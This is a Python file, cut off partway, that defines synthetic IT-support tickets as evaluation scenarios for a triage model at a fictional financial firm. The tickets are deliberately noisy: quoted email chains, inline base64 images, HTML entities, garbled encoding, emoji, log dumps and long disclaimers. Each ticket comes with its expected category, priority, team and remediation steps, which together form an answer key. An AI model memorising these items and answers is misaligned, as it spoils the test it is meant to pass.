"""Data cleanup edge-case scenarios for the Contoso Financial Services eval suite.

These scenarios stress-test the triage model's ability to extract the real
support issue from noisy, malformed, or excessively verbose input.
"""

from ms.evals_core.constants import Category
from ms.evals_core.constants import Channel
from ms.evals_core.constants import MissingInfo
from ms.evals_core.constants import Priority
from ms.evals_core.constants import Team
from ms.evals_core.scenarios.base import ScenarioDefinition


def get_scenarios() -> list[ScenarioDefinition]:
    """Return all Data Cleanup evaluation scenarios."""
    return [
        # ── DC-001  Long email thread with deeply nested quoted replies ──
        ScenarioDefinition(
            scenario_id="DC-001",
            subject="Re: Re: Re: Re: Re: FW: VPN disconnects during market open",
            description=(
                "Hi IT Support,\n\n"
                "Just following up again — the VPN still drops every morning between 09:28 and 09:32 ET.\n"
                "I have to reconnect 3-4 times before it stabilizes. This is impacting my ability to\n"
                "execute trades at market open.\n\n"
                "Thanks,\nMarco\n\n"
                "--- Original Message ---\n"
                "From: Marco Bellini <marco.bellini@contoso.com>\n"
                "Sent: Monday, March 10, 2026 8:45 AM\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Subject: Re: Re: Re: Re: FW: VPN disconnects during market open\n\n"
                "Still happening today. I ran the diagnostics you asked for — attached.\n\n"
                "--- Original Message ---\n"
                "From: IT Support <itsupport@contoso.com>\n"
                "Sent: Friday, March 7, 2026 4:10 PM\n"
                "To: Marco Bellini <marco.bellini@contoso.com>\n"
                "Subject: Re: Re: Re: FW: VPN disconnects during market open\n\n"
                "Hi Marco, could you run 'netsh wlan show all' and send us the output? Also please\n"
                "confirm your GlobalProtect client version. Thanks, Amy\n\n"
                "--- Original Message ---\n"
                "From: Marco Bellini <marco.bellini@contoso.com>\n"
                "Sent: Friday, March 7, 2026 9:05 AM\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Subject: Re: Re: FW: VPN disconnects during market open\n\n"
                "It happened again. I lost the VPN tunnel at exactly 09:30. My colleague Raj in the\n"
                "same building says his works fine, so I don't think it's the office network.\n\n"
                "--- Original Message ---\n"
                "From: IT Support <itsupport@contoso.com>\n"
                "Sent: Thursday, March 6, 2026 3:00 PM\n"
                "To: Marco Bellini <marco.bellini@contoso.com>\n"
                "Subject: Re: FW: VPN disconnects during market open\n\n"
                "Hi Marco, thanks for reporting. Can you tell us which office and floor you're on?\n"
                "Also, are you on Wi-Fi or Ethernet? Regards, Amy\n\n"
                "--- Original Message ---\n"
                "From: Marco Bellini <marco.bellini@contoso.com>\n"
                "Sent: Thursday, March 6, 2026 9:35 AM\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Subject: FW: VPN disconnects during market open\n\n"
                "Hi team, my VPN keeps disconnecting every morning around market open. I'm on the\n"
                "5th floor, Building 3, New York office, using Wi-Fi. It's been going on for a week."
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Investigate recurring VPN tunnel drops correlated with 09:30 ET market-open "
                "traffic spike for user on 5th floor Wi-Fi, Building 3 NYC."
            ),
            remediation_steps=[
                "Check GlobalProtect VPN gateway logs for Marco's session drops between 09:25-09:35 ET.",
                "Correlate with wireless controller data for Building 3, 5th floor AP utilization.",
                "Verify VPN split-tunnel configuration and MTU settings on the client.",
                "If Wi-Fi congestion confirmed, consider moving user to Ethernet or a less congested AP.",
                "Provide user with updated GlobalProtect client if version is outdated.",
            ],
            reporter_name="Marco Bellini",
            reporter_email="marco.bellini@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "long-email", "quoted-replies"],
            difficulty="hard",
        ),
        # ── DC-002  Inline base64-encoded image data ──────────────────────
        ScenarioDefinition(
            scenario_id="DC-002",
            subject="Monitor flickering — screenshot attached inline",
            description=(
                "Hi,\n\n"
                "My external monitor keeps flickering every few seconds. I took a screenshot but our\n"
                "mail client embedded it inline. Here it is:\n\n"
                "[image: screenshot.png]\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4"
                "2mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==\n"
                "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAFUlEQVQYV2"
                "P8z8BQz0AEYBxVOHIVAvcHBQHzKSECAAAAAElFTkSuQmCC\n"
                "data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDA"
                "sLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgN"
                "DRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/"
                "wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAFBABaaaa"
                "AAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/ALQAB//Z\n\n"
                "The flickering started Monday after a Windows Update. It's a Dell U2722D connected\n"
                "via DisplayPort to my docking station (Dell WD19S). The built-in laptop screen is\n"
                "fine. I've tried a different DisplayPort cable already — same issue.\n\n"
                "Priya Nair\n"
                "Risk Management, Building 2, 7th floor"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Troubleshoot Dell U2722D monitor flickering after Windows Update — "
                "likely a display driver regression via WD19S dock."
            ),
            remediation_steps=[
                "Roll back the most recent Intel/NVIDIA display driver update from Windows Update.",
                "Check Dell WD19S firmware version and update if behind current release.",
                "Test monitor on a different docking station to isolate dock vs. driver issue.",
                "If driver rollback resolves, add the driver to the WSUS deferral list.",
            ],
            reporter_name="Priya Nair",
            reporter_email="priya.nair@contoso.com",
            reporter_department="Risk Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64", "inline-image"],
            difficulty="hard",
        ),
        # ── DC-003  HTML-heavy email with tags, styles, entities ──────────
        ScenarioDefinition(
            scenario_id="DC-003",
            subject="Cannot access SharePoint after migration",
            description=(
                '<html><body style="font-family:Calibri,sans-serif;font-size:11pt">'
                '<div style="margin:0;padding:0">'
                "<p><b>Hi IT Team,</b></p>"
                '<p style="color:#1F4E79">Since the SharePoint migration last Friday I can'
                "&rsquo;t open the <b>Compliance Policy Library</b> site. I get a "
                "&ldquo;403 Forbidden&rdquo; error every time I click the link.</p>"
                "<p>Steps I&apos;ve tried:</p>"
                "<ol>"
                "<li>Cleared browser cache &amp; cookies</li>"
                "<li>Tried Edge, Chrome, and Firefox &mdash; same result</li>"
                "<li>Verified my account at <u>myaccount.microsoft.com</u> &mdash; looks fine</li>"
                "<li>Asked my manager Deirdre who can access it fine from her machine</li>"
                "</ol>"
                '<p>My URL is: <a href="https://contoso.sharepoint.com/sites/CompliancePolicyLib">'
                "https://contoso.sharepoint.com/sites/CompliancePolicyLib</a></p>"
                '<p style="font-size:9pt;color:gray">Sent from Outlook for Windows</p>'
                '<p style="font-size:8pt;color:gray">CONFIDENTIALITY NOTICE: This email and any '
                "attachments are for the exclusive and confidential use of the intended recipient. "
                "If you are not the intended recipient, please do not read, distribute, or take "
                "action based on this message.&nbsp;&nbsp;</p>"
                "</div></body></html>"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate 403 Forbidden on SharePoint Compliance Policy Library for user — "
                "likely a permission mapping gap from Friday's migration."
            ),
            remediation_steps=[
                "Check SharePoint admin center for the Compliance Policy Library site permissions.",
                "Verify user's Azure AD group memberships against the migrated site's access list.",
                "Re-grant access to the site collection if permissions were lost during migration.",
                "Confirm user can access the site after permission fix and clear any cached 403.",
            ],
            reporter_name="Aiden O'Sullivan",
            reporter_email="aiden.osullivan@contoso.com",
            reporter_department="Compliance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "html-heavy", "entities"],
            difficulty="hard",
        ),
        # ── DC-004  Garbled / encoding-corrupted text ─────────────────────
        ScenarioDefinition(
            scenario_id="DC-004",
            subject="Printer producing garbled output — urg\u00ebnt",
            description=(
                "Hi,\n\n"
                "The printer on the 3rd floor (HP LaserJet MFP M634) is printing garbled\n"
                "characters on every document. Here\u2019s what the output looks like:\n\n"
                "\u00c3\u00a9\u00c3\u00b1\u00c3\u00bc\u00c3\u00a8\u00c2\u00ab\u00c2\u00bb "
                "\u00ef\u00bf\u00bd\u00ef\u00bf\u00bd\u00ef\u00bf\u00bd "
                "R\u00c3\u00a9port_Q1_2026.xlsx \u00e2\u0080\u0093 Page 1 of 4\n"
                "\u00c3\u0081\u00c3\u00a7\u00c3\u00a7\u00c3\u00a8\u00c3\u0178\u00c3\u0178 "
                "D\u00c3\u00a8ni\u00c3\u00a8d: Pl\u00c3\u00a8\u00c3\u00a0s\u00c3\u00a8 "
                "cont\u00c3\u00a0ct IT\n\n"
                "I\u2019ve tried restarting the printer and switching paper trays. My colleague\n"
                "Fatima confirmed it\u2019s happening for her documents too. We need this fixed\n"
                "today \u2014 we have a board presentation to print.\n\n"
                "Regards,\n"
                "Wei Chen\n"
                "Finance, Building 1, 3rd floor, New York"
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate HP LaserJet MFP M634 on 3rd floor producing garbled output — "
                "likely a corrupt print driver or PCL/PostScript mismatch."
            ),
            remediation_steps=[
                "Check the print server for driver version and compare against HP's latest release.",
                "Reinstall or update the printer driver on the print server.",
                "Verify PCL vs PostScript language setting matches the printer's configuration.",
                "Print a test page from the server to confirm the fix before notifying the user.",
            ],
            reporter_name="Wei Chen",
            reporter_email="wei.chen@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "garbled-text", "encoding"],
            difficulty="hard",
        ),
        # ── DC-005  Emoji-heavy chat message ──────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-005",
            subject="Slack integration broken \U0001f6a8\U0001f6a8\U0001f6a8",
            description=(
                "\U0001f6a8\U0001f6a8\U0001f6a8 URGENT \U0001f6a8\U0001f6a8\U0001f6a8\n\n"
                "Heyy so the Slack \u2194\ufe0f Jira integration is totally broken \U0001f62d"
                "\U0001f62d\U0001f62d\n"
                "When I create a ticket in #trading-incidents it used to auto-create a Jira "
                "issue \U0001f4cb but now NOTHING happens \u274c\u274c\n\n"
                "I\u2019ve checked:\n"
                "\u2705 Slack app is still installed in our workspace\n"
                "\u2705 I can see the Jira bot in the channel\n"
                "\u274c But the /jira create command gives me \U0001f449 "
                '"Oops! Something went wrong (error 502)" \U0001f448\n\n'
                "This is blocking our whole incident workflow \U0001f525\U0001f525\U0001f525 "
                "we literally cannot track prod issues rn \U0001f4a9\n\n"
                "pls help asap \U0001f64f\U0001f64f\U0001f64f\n\n"
                "\u2014 Deshawn\n"
                "\U0001f4bc Institutional Trading\n"
                "\U0001f4cd NYC Building 4, 8th floor"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.TIMESTAMP, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate Slack-Jira integration returning 502 errors in #trading-incidents — "
                "blocking incident tracking workflow for Institutional Trading."
            ),
            remediation_steps=[
                "Check the Jira Cloud status page and Slack API status for ongoing incidents.",
                "Verify the Jira for Slack app OAuth tokens have not expired or been revoked.",
                "Review Jira webhook logs for 502 errors and identify the failing endpoint.",
                "If the integration app needs reauthorization, walk the channel admin through it.",
                "Test /jira create from the channel to confirm resolution.",
            ],
            reporter_name="Deshawn Carter",
            reporter_email="deshawn.carter@contoso.com",
            reporter_department="Institutional Trading",
            channel=Channel.CHAT,
            tags=["data-cleanup", "emoji-heavy", "chat"],
            difficulty="hard",
        ),
        # ── DC-006  Excessive repeated content / copy-paste loops ─────────
        ScenarioDefinition(
            scenario_id="DC-006",
            subject="Outlook keeps crashing — error details inside",
            description=(
                "Outlook crashes every time I open a specific email from the Legal team.\n\n"
                "Here's the error from Event Viewer (it repeated many times):\n\n"
                "Faulting application name: OUTLOOK.EXE, version: 16.0.18227.20162\n"
                "Faulting module name: mso40uiwin32client.dll, version: 16.0.18227.20162\n"
                "Exception code: 0xc0000005\n"
                "Fault offset: 0x00000000005a3b10\n"
                "Faulting application name: OUTLOOK.EXE, version: 16.0.18227.20162\n"
                "Faulting module name: mso40uiwin32client.dll, version: 16.0.18227.20162\n"
                "Exception code: 0xc0000005\n"
                "Fault offset: 0x00000000005a3b10\n"
                "Faulting application name: OUTLOOK.EXE, version: 16.0.18227.20162\n"
                "Faulting module name: mso40uiwin32client.dll, version: 16.0.18227.20162\n"
                "Exception code: 0xc0000005\n"
                "Fault offset: 0x00000000005a3b10\n"
                "Faulting application name: OUTLOOK.EXE, version: 16.0.18227.20162\n"
                "Faulting module name: mso40uiwin32client.dll, version: 16.0.18227.20162\n"
                "Exception code: 0xc0000005\n"
                "Fault offset: 0x00000000005a3b10\n"
                "Faulting application name: OUTLOOK.EXE, version: 16.0.18227.20162\n"
                "Faulting module name: mso40uiwin32client.dll, version: 16.0.18227.20162\n"
                "Exception code: 0xc0000005\n"
                "Fault offset: 0x00000000005a3b10\n\n"
                "This is the only email that causes it. All other emails open fine.\n"
                "I'm on Windows 11 with Microsoft 365 Apps, Current Channel.\n\n"
                "Nadia Al-Rashid\nLegal, Building 2, 4th floor, New York"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Diagnose Outlook crash (0xc0000005 in mso40uiwin32client.dll) triggered "
                "by a specific email — likely a corrupted message or embedded object."
            ),
            remediation_steps=[
                "Identify the specific email causing the crash from the user's mailbox.",
                "Attempt to open the email in Outlook Web App to confirm it is message-specific.",
                "Run Outlook in safe mode to rule out add-in conflicts.",
                "If OWA works, repair the Office installation or update to the latest build.",
                "If the email is corrupted, remove it via MFCMAPI or an admin mailbox tool.",
            ],
            reporter_name="Nadia Al-Rashid",
            reporter_email="nadia.al-rashid@contoso.com",
            reporter_department="Legal",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "repeated-content", "crash-log"],
            difficulty="hard",
        ),
        # ── DC-007  Excessive email signature / legal disclaimer ──────────
        ScenarioDefinition(
            scenario_id="DC-007",
            subject="Badge not working at Building 6 turnstile",
            description=(
                "My badge stopped working at the Building 6 main entrance turnstile this morning. "
                "I had to be let in by security. Can you please reactivate it?\n\n"
                "Thanks,\n"
                "Jonathan Pretorius\n"
                "Vice President, Corporate Strategy\n"
                "Contoso Financial Services\n"
                "1 World Financial Center, 42nd Floor\n"
                "New York, NY 10281\n"
                "Tel: +1 (212) 555-0142 | Mobile: +1 (917) 555-0198\n"
                "Fax: +1 (212) 555-0199\n"
                "Email: jonathan.pretorius@contoso.com\n"
                "LinkedIn: linkedin.com/in/jonathanpretorius\n\n"
                "====================================================================\n"
                "CONFIDENTIALITY NOTICE: This email message, including any attachments,\n"
                "is for the sole use of the intended recipient(s) and may contain\n"
                "confidential and privileged information. Any unauthorized review, use,\n"
                "disclosure, or distribution is prohibited. If you are not the intended\n"
                "recipient, please contact the sender by reply email and destroy all\n"
                "copies of the original message. Receipt by anyone other than the\n"
                "intended recipient(s) is not a waiver of any attorney-client,\n"
                "work product, or other applicable privilege.\n\n"
                "ENVIRONMENTAL NOTICE: Please consider the environment before printing\n"
                "this email. Contoso Financial Services is committed to sustainable\n"
                "business practices.\n\n"
                "IRS CIRCULAR 230 DISCLOSURE: To ensure compliance with requirements\n"
                "imposed by the IRS, we inform you that any U.S. federal tax advice\n"
                "contained in this communication (including any attachments) is not\n"
                "intended or written to be used, and cannot be used, for the purpose\n"
                "of (i) avoiding penalties under the Internal Revenue Code or (ii)\n"
                "promoting, marketing, or recommending to another party any transaction\n"
                "or matter addressed herein.\n"
                "===================================================================="
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P3,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Reactivate or replace badge for user unable to enter Building 6 main entrance turnstile."
            ),
            remediation_steps=[
                "Look up the user's badge ID in the physical access control system.",
                "Check if the badge was deactivated, expired, or flagged for any reason.",
                "Reactivate the badge or issue a replacement if the physical card is damaged.",
                "Test badge at the Building 6 turnstile before confirming with the user.",
            ],
            reporter_name="Jonathan Pretorius",
            reporter_email="jonathan.pretorius@contoso.com",
            reporter_department="Corporate Strategy",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "excessive-signature", "disclaimer"],
            difficulty="medium",
        ),
        # ── DC-008  Mixed languages (English + Mandarin + French) ─────────
        ScenarioDefinition(
            scenario_id="DC-008",
            subject="VDI session freezes / VDI\u4f1a\u8bdd\u51bb\u7ed3 / Session VDI gel\u00e9e",
            description=(
                "Hello IT,\n\n"
                "I work across the Singapore, New York, and London offices and my VDI session\n"
                "has been freezing intermittently.\n\n"
                "\u5f53\u6211\u8fde\u63a5\u5230\u65b0\u52a0\u5761\u6570\u636e\u4e2d\u5fc3"
                "\u7684VDI\u65f6\uff0c\u4f1a\u8bdd\u5728\u5927\u7ea6"
                "20\u5206\u949f\u540e\u51bb\u7ed3\u3002\u5c4f\u5e55\u505c\u6b62\u54cd\u5e94"
                "\uff0c\u6211\u5fc5\u987b\u65ad\u5f00\u5e76\u91cd\u65b0\u8fde\u63a5\u3002"
                "\u8fd9\u79cd\u60c5\u51b5\u6bcf\u5929\u53d1\u751f3-4\u6b21\u3002\n\n"
                "Quand je me connecte depuis le bureau de Londres, la session VDI g\u00e8le\n"
                "apr\u00e8s environ 20 minutes. L'\u00e9cran ne r\u00e9pond plus et je dois me\n"
                "d\u00e9connecter puis me reconnecter. Cela arrive 3 \u00e0 4 fois par jour.\n\n"
                "From New York the connection is stable. The issue only happens when I connect\n"
                "to the Singapore or London VDI pools. My laptop is a ThinkPad X1 Carbon Gen 11\n"
                "with VMware Horizon Client 2312.\n\n"
                "Xin Li (\u674e\u6b23)\n"
                "Quantitative Analysis\n"
                "Building 5, 9th floor, New York (home office)"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate VDI session freezes when user connects to Singapore and London "
                "pools — likely WAN latency or VMware Horizon blast protocol issue."
            ),
            remediation_steps=[
                "Review VMware Horizon connection server logs for the user's sessions in SG and LDN.",
                "Measure round-trip latency and packet loss from the user's NYC location to SG/LDN.",
                "Check if the Blast Extreme protocol is tuned for high-latency WAN links.",
                "Consider enabling the Horizon Performance Tracker on the client for diagnostics.",
                "If WAN quality is the root cause, evaluate SD-WAN or dedicated VDI circuit options.",
            ],
            reporter_name="Xin Li",
            reporter_email="xin.li@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "mixed-languages", "multilingual"],
            difficulty="hard",
        ),
        # ── DC-009  Truncated message (cut off mid-sentence) ──────────────
        ScenarioDefinition(
            scenario_id="DC-009",
            subject="Database replication lag causing stale portfolio data",
            description=(
                "Hi Data Platform team,\n\n"
                "We've noticed that the portfolio valuations dashboard is showing data that's\n"
                "approximately 45 minutes stale. The replication from the primary SQL Server\n"
                "(SQLPROD-NYC-01) to the read replica (SQLREPLICA-NYC-03) appears to be lagging.\n\n"
                "Impact: Portfolio managers are making decisions based on outdated valuations.\n"
                "This affects approximately 30 PMs across Wealth Management and Asset Management.\n\n"
                "What we've confirmed so far:\n"
                "- Primary database is current (checked via direct query at 14:22 ET)\n"
                "- Read replica is behind by ~2,700 transactions\n"
                "- The lag started around 13:35 ET today\n"
                "- No recent schema changes or maintenance windows\n"
                "- Disk I/O on the replica server looks elevated: avg write latency 48ms vs\n"
                "  normal 5ms\n\n"
                "We need this resolved urgently. The EOD NAV calculation process kicks off at\n"
                "16:00 ET and reads from the replica. If the lag isn't cleared by then, we'll\n"
                "have incorrect NAV calculations which will trigger regulatory reporting\n"
                "discrepancies and we'll need to file correc"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P1,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Urgently resolve SQL Server replication lag on SQLREPLICA-NYC-03 before "
                "16:00 ET EOD NAV calculation — 45-minute data staleness affecting 30 PMs."
            ),
            remediation_steps=[
                "Check disk subsystem on SQLREPLICA-NYC-03 for I/O bottleneck (48ms write latency).",
                "Review SQL Server replication monitor for error states or suspended subscriptions.",
                "If disk I/O is the bottleneck, identify competing workloads and throttle or stop them.",
                "Consider reinitializing replication from a snapshot if the lag cannot be recovered.",
                "Notify portfolio management leads of potential data staleness and EOD NAV risk.",
            ],
            reporter_name="Soren Andersen",
            reporter_email="soren.andersen@contoso.com",
            reporter_department="Data Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "truncated-message", "database"],
            difficulty="hard",
        ),
        # ── DC-010  HTML entities and escaped characters throughout ────────
        ScenarioDefinition(
            scenario_id="DC-010",
            subject="Can&#39;t log in to trading platform &mdash; &quot;session expired&quot;",
            description=(
                "Every time I try to log in to the Contoso Trading Platform (CTP) I get the\n"
                "error: &quot;Your session has expired. Please contact your administrator.&quot;\n\n"
                "I&apos;ve tried:\n"
                "1. Clearing cookies &amp; cache\n"
                "2. Using incognito&#47;private mode\n"
                "3. Trying from a different machine\n"
                "4. Resetting my password via the &quot;Forgot Password&quot; link\n\n"
                "None of these work. I&apos;m getting the same error on both my laptop &amp;\n"
                "my desktop. My colleagues in the same team can log in fine.\n\n"
                "This started after the maintenance window last night (March 17 &ndash; 18).\n"
                "I&apos;m locked out of all my positions and can&apos;t execute trades.\n\n"
                "Kenji Watanabe &lt;kenji.watanabe@contoso.com&gt;\n"
                "Derivatives, Building 4, 6th floor\n"
                "Ext: 5&#45;4477"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P1,
            team=Team.IAM,
            needs_escalation=True,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD],
            next_best_action=(
                "Restore CTP access for trader locked out after maintenance window — "
                "session token or account state likely not migrated correctly."
            ),
            remediation_steps=[
                "Check CTP identity provider logs for Kenji's failed authentication attempts.",
                "Verify the user's account was not disabled or locked during maintenance.",
                "Clear stale session tokens in the CTP session store for this user.",
                "If SAML/OIDC tokens were rotated during maintenance, ensure the user's IdP mapping is current.",
                "Confirm login works and monitor for recurrence over the next trading session.",
            ],
            reporter_name="Kenji Watanabe",
            reporter_email="kenji.watanabe@contoso.com",
            reporter_department="Derivatives",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "html-entities", "escaped-chars"],
            difficulty="hard",
        ),
        # ── DC-011  Application log dump pasted into ticket ───────────────
        ScenarioDefinition(
            scenario_id="DC-011",
            subject="Jenkins build pipeline failing since this morning",
            description=(
                "The CI/CD pipeline for the risk-engine repo has been failing since 06:15 AM.\n"
                "Here's the full console output:\n\n"
                "[2026-03-18T06:15:02Z] Starting pipeline: risk-engine/main #1847\n"
                "[2026-03-18T06:15:02Z] Checking out git repo...\n"
                "[2026-03-18T06:15:05Z] HEAD is now at a3f7c21 Merge PR #492\n"
                "[2026-03-18T06:15:05Z] Running stage: Install Dependencies\n"
                "[2026-03-18T06:15:06Z] npm ci --prefer-offline\n"
                "[2026-03-18T06:15:12Z] added 1847 packages in 6.1s\n"
                "[2026-03-18T06:15:12Z] Running stage: Build\n"
                "[2026-03-18T06:15:13Z] tsc --build tsconfig.json\n"
                "[2026-03-18T06:15:28Z] Build completed successfully\n"
                "[2026-03-18T06:15:28Z] Running stage: Unit Tests\n"
                "[2026-03-18T06:15:29Z] jest --ci --coverage\n"
                "[2026-03-18T06:16:45Z] Tests: 342 passed, 342 total\n"
                "[2026-03-18T06:16:45Z] Running stage: Integration Tests\n"
                "[2026-03-18T06:16:46Z] jest --ci --config jest.integration.config.js\n"
                "[2026-03-18T06:17:01Z] Connecting to test database: sqltest-nyc-02:1433\n"
                "[2026-03-18T06:17:16Z] ERROR: Connection refused to sqltest-nyc-02:1433\n"
                "[2026-03-18T06:17:16Z] Error: connect ECONNREFUSED 10.42.8.15:1433\n"
                "[2026-03-18T06:17:16Z]     at TCPConnectWrap.afterConnect [as oncomplete]\n"
                "[2026-03-18T06:17:16Z] Tests: 0 passed, 18 failed, 18 total\n"
                "[2026-03-18T06:17:16Z] Pipeline FAILED at stage: Integration Tests\n"
                "[2026-03-18T06:17:17Z] Sending failure notification to #risk-engine-ci\n"
                "[2026-03-18T06:17:17Z] Pipeline duration: 2m 15s\n\n"
                "This has failed on every retry (5 times now). The test DB seems to be down.\n\n"
                "— Rafael Oliveira, Backend Engineering"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[],
            next_best_action=(
                "Restore connectivity to integration test database sqltest-nyc-02:1433 — "
                "CI/CD pipeline for risk-engine repo blocked since 06:15 AM."
            ),
            remediation_steps=[
                "Check if sqltest-nyc-02 SQL Server service is running and accepting connections.",
                "Verify network connectivity from the Jenkins agent to 10.42.8.15:1433.",
                "Check if there was a maintenance or patching event on sqltest-nyc-02 overnight.",
                "Restart the SQL Server service if it is stopped, and verify integration tests pass.",
                "Notify the Backend Engineering team once the pipeline is green.",
            ],
            reporter_name="Rafael Oliveira",
            reporter_email="rafael.oliveira@contoso.com",
            reporter_department="Backend Engineering",
            channel=Channel.CHAT,
            tags=["data-cleanup", "log-dump", "ci-cd"],
            difficulty="hard",
        ),
        # ── DC-012  Duplicate sentences and stuttering content ────────────
        ScenarioDefinition(
            scenario_id="DC-012",
            subject="Zoom phone not ringing — calls go straight to voicemail",
            description=(
                "Hi,\n\n"
                "My Zoom Phone has stopped ringing for incoming calls. Calls go straight to\n"
                "voicemail. My Zoom Phone has stopped ringing for incoming calls. Calls go\n"
                "straight to voicemail.\n\n"
                "I've checked my Do Not Disturb settings and they are off. I've checked my Do\n"
                "Not Disturb settings and they are off. The Zoom desktop client shows I'm\n"
                "available (green dot). The Zoom desktop client shows I'm available (green dot).\n\n"
                "My extension is 5-2201 and my direct number is +1 (212) 555-2201. Clients have\n"
                "been complaining they can't reach me. My extension is 5-2201 and my direct\n"
                "number is +1 (212) 555-2201. Clients have been complaining they can't reach me.\n\n"
                "This started yesterday afternoon. I tried signing out and back in, same issue.\n"
                "This started yesterday afternoon. I tried signing out and back in, same issue.\n\n"
                "Please help,\n"
                "Elena Vasquez\n"
                "Client Services, Building 1, 6th floor"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Troubleshoot Zoom Phone call routing for ext 5-2201 — incoming calls "
                "going directly to voicemail despite available status."
            ),
            remediation_steps=[
                "Check Zoom Phone admin portal for call routing rules on extension 5-2201.",
                "Verify there is no call forwarding or after-hours rule overriding the user's status.",
                "Check if the Zoom Phone license is active and properly assigned to the user.",
                "Test inbound call to the user's direct number while monitoring the admin dashboard.",
                "Update the Zoom desktop client if the version is outdated.",
            ],
            reporter_name="Elena Vasquez",
            reporter_email="elena.vasquez@contoso.com",
            reporter_department="Client Services",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "duplicate-content", "stuttering"],
            difficulty="hard",
        ),
        # ── DC-013  Extremely long email with buried issue ────────────────
        ScenarioDefinition(
            scenario_id="DC-013",
            subject="FW: Quarterly IT Infrastructure Review — action items and network issue",
            description=(
                "Hi IT Support,\n\n"
                "Forwarding the full infrastructure review notes below — my actual issue is buried\n"
                "near the bottom. Please scroll down.\n\n"
                "====== QUARTERLY IT INFRASTRUCTURE REVIEW — Q1 2026 ======\n"
                "Date: March 14, 2026 | Attendees: IT Steering Committee\n"
                "Location: Building 4, Executive Conference Room 4A\n\n"
                "AGENDA ITEM 1: Cloud Migration Status\n"
                "- Azure landing zone provisioning is 94% complete across all three regions.\n"
                "- Remaining workloads: legacy COBOL settlement engine (target: May 2026),\n"
                "  on-prem Oracle RAC cluster for derivatives pricing (target: July 2026).\n"
                "- Cost optimization: reserved instance coverage improved from 61% to 78%.\n"
                "- Action: Cloud team to finalize RI recommendations for Q2 by March 28.\n\n"
                "AGENDA ITEM 2: Endpoint Refresh Program\n"
                "- 1,200 of 3,400 laptops refreshed to Dell Latitude 5550 with Windows 11 23H2.\n"
                "- Remaining rollout schedule: NYC Building 1-3 (April), London (May), Singapore (June).\n"
                "- Dock compatibility issues reported with TB16 docks — WD19S replacement in progress.\n"
                "- BitLocker recovery key escrow migration to Intune on track for April 1.\n"
                "- Action: Endpoint team to publish refresh FAQ on the intranet by March 21.\n\n"
                "AGENDA ITEM 3: Network Capacity Planning\n"
                "- Core switch fabric utilization peaked at 72% during February month-end processing.\n"
                "- Wireless controller firmware upgraded to 8.10.185 across all NYC APs.\n"
                "- SD-WAN deployment for London and Singapore branch offices approved — RFP in April.\n"
                "- Action: Network ops to model 100G uplink requirements for 2027 budget.\n\n"
                "AGENDA ITEM 4: Security & Compliance Update\n"
